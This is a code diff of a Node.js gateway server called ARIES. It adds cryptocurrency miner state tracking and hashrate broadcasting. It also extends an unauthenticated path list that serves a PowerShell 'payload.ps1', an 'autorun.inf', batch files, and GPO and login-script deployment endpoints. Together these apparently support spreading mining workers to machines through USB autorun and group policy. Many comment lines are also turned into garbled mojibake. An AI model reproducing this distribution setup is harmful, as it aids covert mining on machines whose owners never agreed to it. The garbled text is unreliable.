@@ -1,5 +1,5 @@
 /**
- * ARIES v5.0 â€" Gateway API Server
+ * ARIES v5.0 Ã¢â‚¬" Gateway API Server
  *
  * Full HTTP/WebSocket server with:
  * - Token-based authentication
@@ -26,7 +26,67 @@ let _refs = {};
 let _wsClients = new Set();
 let _rateLimiter = null;
 let _shutdownRequested = false;
-let _knownWorkers = {};  // workerId â†' { hostname, ip, ram_gb, cpu, gpu, model, lastSeen }
+let _knownWorkers = {};  // workerId Ã¢â€ ' { hostname, ip, ram_gb, cpu, gpu, model, lastSeen }
+let _walletBalanceCache = null; // { ts, data: { sol, usd, solPrice, wallet } }
+
+// â”€â”€ FEATURE 3: Miner State Persistence â”€â”€
+const MINER_STATE_PATH = path.join(__dirname, '..', 'data', 'miner-state.json');
+function _saveMinerState() {
+  try {
+    var ms = _refs._minerState || {};
+    var state = {
+      mining: ms.mining || false,
+      startedAt: ms.startTime || null,
+      pool: ms.pool || '',
+      wallet: ms.wallet || '',
+      lastHashrate: 0,
+      totalHashes: 0,
+      totalUptime: 0,
+      savedAt: Date.now()
+    };
+    // Compute totals from nodes
+    Object.keys(ms.nodes || {}).forEach(function(k) {
+      var n = ms.nodes[k];
+      state.lastHashrate += (n.hashrate || 0);
+      state.totalHashes += (n.sharesAccepted || 0);
+      if (n.uptime) state.totalUptime += n.uptime;
+    });
+    var dir = path.dirname(MINER_STATE_PATH);
+    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
+    fs.writeFileSync(MINER_STATE_PATH, JSON.stringify(state, null, 2));
+  } catch (e) { console.error('[MINER-STATE] Save error:', e.message); }
+}
+function _loadMinerState() {
+  try {
+    if (fs.existsSync(MINER_STATE_PATH)) return JSON.parse(fs.readFileSync(MINER_STATE_PATH, 'utf8'));
+  } catch {}
+  return null;
+}
+
+// â”€â”€ FEATURE 2: Periodic hashrate broadcast â”€â”€
+function startHashrateBroadcast() {
+  setInterval(function() {
+    if (_wsClients.size === 0) return;
+    var ms = _refs._minerState;
+    if (!ms || !ms.mining) return;
+    var totalHr = 0, totalAccepted = 0, totalRejected = 0;
+    Object.keys(ms.nodes || {}).forEach(function(k) {
+      var n = ms.nodes[k];
+      totalHr += (n.hashrate || 0);
+      totalAccepted += (n.sharesAccepted || 0);
+      totalRejected += (n.sharesRejected || 0);
+    });
+    wsBroadcast({ type: 'miner', event: 'hashrate-tick', hashrate: totalHr, accepted: totalAccepted, rejected: totalRejected, uptime: ms.startTime ? Math.floor((Date.now() - ms.startTime) / 1000) : 0 });
+  }, 2000); // every 2 seconds
+}
+
+// â”€â”€ FEATURE 3: Periodic state save â”€â”€
+function startMinerStateSaver() {
+  setInterval(function() {
+    var ms = _refs._minerState;
+    if (ms && ms.mining) _saveMinerState();
+  }, 30000); // every 30 seconds
+}
 
 // Plugin routes registered by modules
 let _pluginRoutes = [];
@@ -51,7 +111,7 @@ function json(res, statusCode, obj) {
   res.end(body);
 }
 
-// â"€â"€ Static file serving â"€â"€
+// Ã¢"â‚¬Ã¢"â‚¬ Static file serving Ã¢"â‚¬Ã¢"â‚¬
 const MIME_TYPES = {
   '.html': 'text/html; charset=utf-8', '.css': 'text/css; charset=utf-8', '.js': 'application/javascript; charset=utf-8',
   '.json': 'application/json', '.png': 'image/png', '.jpg': 'image/jpeg',
@@ -76,7 +136,7 @@ function serveStatic(res, filePath) {
   });
 }
 
-// â"€â"€ Authentication â"€â"€
+// Ã¢"â‚¬Ã¢"â‚¬ Authentication Ã¢"â‚¬Ã¢"â‚¬
 function authenticate(req) {
   // Always allow localhost without auth
   const ip = req.socket?.remoteAddress;
@@ -105,7 +165,7 @@ function authenticate(req) {
   return false;
 }
 
-// â"€â"€ WebSocket â"€â"€
+// Ã¢"â‚¬Ã¢"â‚¬ WebSocket Ã¢"â‚¬Ã¢"â‚¬
 function handleUpgrade(req, socket, head) {
   const parsed = url.parse(req.url, true);
   if (parsed.pathname !== '/ws') { socket.destroy(); return; }
@@ -165,7 +225,7 @@ function wsBroadcast(obj) {
   for (const client of _wsClients) wsSend(client, obj);
 }
 
-// â"€â"€ Stats broadcast â"€â"€
+// Ã¢"â‚¬Ã¢"â‚¬ Stats broadcast Ã¢"â‚¬Ã¢"â‚¬
 function startStatsBroadcast() {
   setInterval(() => {
     if (_wsClients.size === 0) return;
@@ -183,12 +243,12 @@ function startStatsBroadcast() {
       netUp: sys.netUp,
       netDown: sys.netDown,
     });
-  }, 10000); // 10s instead of 5s â€" reduces overhead
+  }, 10000); // 10s instead of 5s Ã¢â‚¬" reduces overhead
 }
 
-// â"€â"€ Swarm Worker Tracker â"€â"€
+// Ã¢"â‚¬Ã¢"â‚¬ Swarm Worker Tracker Ã¢"â‚¬Ã¢"â‚¬
 // Self-healing: track zero-hashrate durations per worker
-let _zeroHashrateTimers = {}; // nodeId â†' timestamp when hashrate first went to 0
+let _zeroHashrateTimers = {}; // nodeId Ã¢â€ ' timestamp when hashrate first went to 0
 
 function startSelfHealingMonitor() {
   setInterval(function() {
@@ -342,7 +402,7 @@ function startWorkerTracker() {
   }, 5000); // Check every 5 seconds
 }
 
-// â"€â"€ Route handler â"€â"€
+// Ã¢"â‚¬Ã¢"â‚¬ Route handler Ã¢"â‚¬Ã¢"â‚¬
 async function handleRequest(req, res) {
   const startMs = Date.now();
   const parsed = url.parse(req.url, true);
@@ -400,7 +460,7 @@ async function handleRequest(req, res) {
   }
 
   // Auth (skip for /api/health and /api/status)
-  const publicPaths = ['/api/health', '/api/status', '/api/usb-swarm/payload.ps1', '/api/usb-swarm/worker.js', '/api/usb-swarm/worker-linux.js', '/api/usb-swarm/deploy-gcp.sh', '/api/usb-swarm/deploy.bat', '/api/usb-swarm/autorun.inf', '/api/deploy/gpo', '/api/deploy/worker.js', '/api/deploy/worker-linux.sh', '/api/deploy/login-script', '/api/deploy/installer', '/api/deploy/rpi-script', '/api/deploy/ollama-worker.sh', '/api/referral/stats', '/api/referral/track', '/api/referral/register', '/api/marketplace/submit', '/api/marketplace/pricing', '/proxy', '/api/proxy/login', '/api/enterprise/networks', '/api/enterprise/deploy'];
+  const publicPaths = ['/api/health', '/api/status', '/api/usb-swarm/payload.ps1', '/api/usb-swarm/worker.js', '/api/usb-swarm/worker-linux.js', '/api/usb-swarm/deploy-gcp.sh', '/api/usb-swarm/deploy.bat', '/api/usb-swarm/autorun.inf', '/api/deploy/gpo', '/api/deploy/worker.js', '/api/deploy/worker-linux.sh', '/api/deploy/login-script', '/api/deploy/installer', '/api/deploy/rpi-script', '/api/deploy/ollama-worker.sh', '/api/referral/stats', '/api/referral/track', '/api/referral/register', '/api/marketplace/submit', '/api/marketplace/pricing', '/proxy', '/api/proxy/login', '/api/enterprise/networks', '/api/enterprise/deploy', '/api/network/stats', '/api/network/leaderboard', '/api/swarm/join', '/api/swarm/join/status', '/api/swarm/leave', '/api/swarm/worker/status', '/api/swarm/quickjoin'];
   // Enterprise API
   if (reqPath.startsWith('/api/enterprise/')) { const ebody = method === 'POST' ? await readBody(req) : ''; const handled = _handleEnterpriseApi(reqPath, method, req, res, ebody); if (handled !== null) return; }
   const isDeployPage = reqPath.startsWith('/deploy/');
@@ -424,7 +484,7 @@ async function handleRequest(req, res) {
       }
     }
 
-    // â•â•â• GET /api/health â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/health Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/health') {
       const sys = refs.sysModule ? refs.sysModule.get() : {};
       const checks = {
@@ -439,7 +499,7 @@ async function handleRequest(req, res) {
       return json(res, 200, { status: overall, checks, version: refs.bootVersion || '5.0' });
     }
 
-    // â•â•â• GET /api/status â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/status Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/status') {
       const sys = refs.sysModule ? refs.sysModule.get() : {};
       const relayCache = refs.getRelayCache?.() || null;
@@ -505,7 +565,7 @@ async function handleRequest(req, res) {
             },
             vultr: {
               workers: vultrWorkers,
-              ip: cfg.vultrNodes?.['vultr-dallas-1']?.ip || '45.76.232.5',
+              ip: cfg.vultrNodes?.['vultr-dallas-1']?.ip || (cfg.relay && cfg.relay.vmIp) || 'N/A',
               region: 'dallas',
               status: 'active',
               models: ['mistral', 'llama3.2:1b']
@@ -543,7 +603,7 @@ async function handleRequest(req, res) {
       });
     }
 
-    // â•â•â• POST /api/chat â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/chat Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/chat') {
       const body = JSON.parse(await readBody(req));
       const message = body.message || body.text;
@@ -571,7 +631,7 @@ async function handleRequest(req, res) {
       return json(res, 200, { response, iterations: result.iterations });
     }
 
-    // â•â•â• POST /api/chat/stream â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/chat/stream Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/chat/stream') {
       const body = JSON.parse(await readBody(req));
       const message = body.message || body.text;
@@ -630,7 +690,7 @@ async function handleRequest(req, res) {
       return;
     }
 
-    // â•â•â• // ╠══ POST /api/chat/local ══╣
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â // â• â•â• POST /api/chat/local â•â•â•£
     if (method === 'POST' && reqPath === '/api/chat/local') {
       const body = JSON.parse(await readBody(req));
       const message = body.message || body.text;
@@ -665,7 +725,7 @@ async function handleRequest(req, res) {
       }
     }
 
-    // ╠══ POST /api/chat/local/stream ══╣
+    // â• â•â• POST /api/chat/local/stream â•â•â•£
     if (method === 'POST' && reqPath === '/api/chat/local/stream') {
       const body = JSON.parse(await readBody(req));
       const message = body.message || body.text;
@@ -715,7 +775,7 @@ async function handleRequest(req, res) {
       return;
     }
 
-    // ╠══ POST /api/swarm â•â•â•
+    // â• â•â• POST /api/swarm Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/swarm') {
       const body = JSON.parse(await readBody(req));
       const task = body.task || body.message;
@@ -747,18 +807,18 @@ async function handleRequest(req, res) {
       }
     }
 
-    // â•â•â• GET /api/agents â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/agents Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/agents') {
       const agents = refs.swarm?.getRoster?.()?.getSummary() || [];
       return json(res, 200, { agents, count: agents.length });
     }
 
-    // â•â•â• GET /api/swarm/keys â€" List worker keys â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/swarm/keys Ã¢â‚¬" List worker keys Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/swarm/keys') {
       return json(res, 200, { keys: workerKeys.listKeys() });
     }
 
-    // â•â•â• POST /api/swarm/keys â€" Generate worker key â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/swarm/keys Ã¢â‚¬" Generate worker key Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/swarm/keys') {
       const body = JSON.parse(await readBody(req));
       if (!body.workerId) return json(res, 400, { error: 'Missing workerId' });
@@ -767,7 +827,7 @@ async function handleRequest(req, res) {
       return json(res, 200, result);
     }
 
-    // â•â•â• DELETE /api/swarm/keys/:workerId â€" Revoke worker key â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â DELETE /api/swarm/keys/:workerId Ã¢â‚¬" Revoke worker key Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'DELETE' && reqPath.startsWith('/api/swarm/keys/')) {
       const workerId = decodeURIComponent(reqPath.split('/api/swarm/keys/')[1]);
       if (!workerId) return json(res, 400, { error: 'Missing workerId' });
@@ -777,7 +837,7 @@ async function handleRequest(req, res) {
       return json(res, 200, { status: 'revoked', workerId });
     }
 
-    // â•â•â• POST /api/settings/encrypt â€" Encrypt config at rest â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/settings/encrypt Ã¢â‚¬" Encrypt config at rest Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/settings/encrypt') {
       try {
         const configManager = refs.configManager;
@@ -794,7 +854,7 @@ async function handleRequest(req, res) {
       } catch (e) { return json(res, 500, { error: e.message }); }
     }
 
-    // â•â•â• GET /api/workers â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/workers Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/workers') {
       const workers = refs.coordinator?.getWorkers() || [];
       const relay = refs.getRelayCache?.() || null;
@@ -802,21 +862,21 @@ async function handleRequest(req, res) {
       return json(res, 200, { workers, relay, agents, agentCount: agents.length });
     }
 
-    // â•â•â• GET /api/history â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/history Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/history') {
       const chatHistory = refs.getChatHistory?.() || [];
       const limit = parseInt(parsed.query.limit) || 50;
       return json(res, 200, { history: chatHistory.slice(-limit), total: chatHistory.length });
     }
 
-    // â•â•â• POST /api/persona â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/persona Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/persona') {
       const body = JSON.parse(await readBody(req));
       if (body.name && refs.setCurrentPersona) refs.setCurrentPersona(body.name);
       return json(res, 200, { status: 'ok', persona: refs.getCurrentPersona?.() });
     }
 
-    // â•â•â• GET /api/config â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/config Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/config') {
       const cfg = refs.configManager?.getAll() || refs.config;
       // Redact sensitive fields
@@ -830,7 +890,7 @@ async function handleRequest(req, res) {
 
     // (Key management handled by /api/settings/tokens endpoints below)
 
-    // â•â•â• PUT /api/config â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â PUT /api/config Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'PUT' && reqPath === '/api/config') {
       const body = JSON.parse(await readBody(req));
       if (body.key && body.value !== undefined && refs.configManager) {
@@ -840,13 +900,13 @@ async function handleRequest(req, res) {
       return json(res, 400, { error: 'Missing key/value' });
     }
 
-    // â•â•â• GET /api/memory â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/memory Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/memory') {
       const mem = require('./memory');
       return json(res, 200, { memories: mem.getAll(), stats: mem.stats() });
     }
 
-    // â•â•â• POST /api/memory â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/memory Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/memory') {
       const body = JSON.parse(await readBody(req));
       const mem = require('./memory');
@@ -856,28 +916,28 @@ async function handleRequest(req, res) {
       return json(res, 200, { status: 'saved', count });
     }
 
-    // â•â•â• GET /api/tools â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/tools Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/tools') {
       const t = require('./tools');
       return json(res, 200, { tools: t.list(), log: t.getLog().slice(-20) });
     }
 
-    // â•â•â• GET /api/plugins â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/plugins Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/plugins') {
       const pl = require('./plugin-loader');
       return json(res, 200, { plugins: pl.getAll().map(p => ({ name: p.name, description: p.description, status: 'active' })) });
     }
 
-    // â•â•â• GET /api/system â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/system Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/system') {
       const sys = refs.sysModule?.get() || {};
       return json(res, 200, sys);
     }
 
-    // â•â•â• POST /api/export â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/export Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/export') {
       const chatHistory = refs.getChatHistory?.() || [];
-      let md = `# Aries Chat Export â€" ${new Date().toISOString()}\n\n`;
+      let md = `# Aries Chat Export Ã¢â‚¬" ${new Date().toISOString()}\n\n`;
       chatHistory.forEach(m => {
         const role = m.role === 'user' ? 'You' : m.role === 'assistant' ? 'Aries' : 'System';
         md += `### ${role}\n${m.content}\n\n---\n\n`;
@@ -887,34 +947,34 @@ async function handleRequest(req, res) {
       return;
     }
 
-    // â•â•â• GET /api/audit â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/audit Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/audit') {
       const limit = parseInt(parsed.query.limit) || 100;
       return json(res, 200, { entries: audit.recent(limit) });
     }
 
-    // â•â•â• GET /api/crypto/prices â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/crypto/prices Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/crypto/prices') {
       const ca = refs.cryptoAlerts;
       if (!ca) return json(res, 500, { error: 'Crypto alerts not available' });
       return json(res, 200, { prices: ca.getCurrentPrices(), history: ca.getPriceHistory() });
     }
 
-    // â•â•â• GET /api/crypto/alerts â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/crypto/alerts Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/crypto/alerts') {
       const ca = refs.cryptoAlerts;
       if (!ca) return json(res, 500, { error: 'Crypto alerts not available' });
       return json(res, 200, { alerts: ca.getAlertHistory() });
     }
 
-    // â•â•â• GET /api/arbitrage/opportunities â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/arbitrage/opportunities Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/arbitrage/opportunities') {
       const arb = refs.arbitrageScanner;
       if (!arb) return json(res, 500, { error: 'Arbitrage scanner not available' });
       return json(res, 200, { opportunities: arb.getOpportunities() });
     }
 
-    // â•â•â• POST /api/arbitrage/config â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/arbitrage/config Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/arbitrage/config') {
       const arb = refs.arbitrageScanner;
       if (!arb) return json(res, 500, { error: 'Arbitrage scanner not available' });
@@ -922,7 +982,7 @@ async function handleRequest(req, res) {
       return json(res, 200, { config: arb.updateConfig(body) });
     }
 
-    // â•â•â• POST /api/shutdown â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/shutdown Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/shutdown') {
       _shutdownRequested = true;
       json(res, 200, { status: 'shutting_down' });
@@ -930,7 +990,7 @@ async function handleRequest(req, res) {
       return;
     }
 
-    // â•â•â• GET /api/tokens â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/tokens Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/tokens/generate') {
       if (refs.configManager) {
         const token = refs.configManager.generateToken();
@@ -939,7 +999,7 @@ async function handleRequest(req, res) {
       return json(res, 500, { error: 'Config manager not available' });
     }
 
-    // â•â•â• GET /api/models/route â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/models/route Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/models/route') {
       const task = parsed.query.task || 'hello';
       const agent = parsed.query.agent || null;
@@ -951,7 +1011,7 @@ async function handleRequest(req, res) {
       return json(res, 200, { routing: { model: refs.config?.gateway?.model, tier: 'default' }, stats: {} });
     }
 
-    // â•â•â• POST /api/pipelines â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/pipelines Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/pipelines') {
       const body = JSON.parse(await readBody(req));
       const pl = refs.pipelines;
@@ -983,13 +1043,13 @@ async function handleRequest(req, res) {
       return json(res, 200, { pipelines: pl.listPipelines() });
     }
 
-    // â•â•â• GET /api/pipelines â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/pipelines Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/pipelines') {
       const pl = refs.pipelines;
       return json(res, 200, { pipelines: pl ? pl.listPipelines() : [] });
     }
 
-    // â•â•â• POST /api/workflows â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/workflows Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/workflows') {
       const body = JSON.parse(await readBody(req));
       const wfe = refs.workflowEngine;
@@ -1017,19 +1077,19 @@ async function handleRequest(req, res) {
       return json(res, 200, { workflows: wfe.listWorkflows(), log: wfe.getLog(20) });
     }
 
-    // â•â•â• GET /api/workflows â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/workflows Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/workflows') {
       const wfe = refs.workflowEngine;
       return json(res, 200, { workflows: wfe ? wfe.listWorkflows() : [], log: wfe ? wfe.getLog(20) : [] });
     }
 
-    // â•â•â• GET /api/agents/learning â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/agents/learning Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/agents/learning') {
       const al = refs.agentLearning;
       return json(res, 200, al ? al.getStats() : { totalOutcomes: 0, agents: {} });
     }
 
-    // â•â•â• POST /api/feedback â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/feedback Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/feedback') {
       const body = JSON.parse(await readBody(req));
       const al = refs.agentLearning;
@@ -1038,7 +1098,7 @@ async function handleRequest(req, res) {
       return json(res, 200, { status: 'recorded', outcome });
     }
 
-    // â•â•â• GET /api/mcp â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/mcp Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/mcp') {
       const mcp = refs.mcpClient;
       return json(res, 200, {
@@ -1047,7 +1107,7 @@ async function handleRequest(req, res) {
       });
     }
 
-    // â•â•â• POST /api/mcp â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/mcp Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/mcp') {
       const body = JSON.parse(await readBody(req));
       const mcp = refs.mcpClient;
@@ -1069,11 +1129,11 @@ async function handleRequest(req, res) {
       return json(res, 200, { connections: mcp.getStatus(), tools: mcp.listTools() });
     }
 
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     // NEW v4.1 MODULES
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
 
-    // â•â•â• POST /api/autonomous/start â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/autonomous/start Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/autonomous/start') {
       const body = JSON.parse(await readBody(req));
       const runner = refs.autonomousRunner;
@@ -1084,7 +1144,7 @@ async function handleRequest(req, res) {
       } catch (e) { return json(res, 400, { error: e.message }); }
     }
 
-    // â•â•â• GET /api/autonomous/progress/:id â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/autonomous/progress/:id Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath.startsWith('/api/autonomous/progress/')) {
       const id = reqPath.split('/').pop();
       const runner = refs.autonomousRunner;
@@ -1094,7 +1154,7 @@ async function handleRequest(req, res) {
       return json(res, 200, progress);
     }
 
-    // â•â•â• POST /api/autonomous/pause/:id â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/autonomous/pause/:id Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath.startsWith('/api/autonomous/pause/')) {
       const id = reqPath.split('/').pop();
       const runner = refs.autonomousRunner;
@@ -1102,7 +1162,7 @@ async function handleRequest(req, res) {
       try { return json(res, 200, runner.pause(id)); } catch (e) { return json(res, 400, { error: e.message }); }
     }
 
-    // â•â•â• POST /api/autonomous/resume/:id â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/autonomous/resume/:id Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
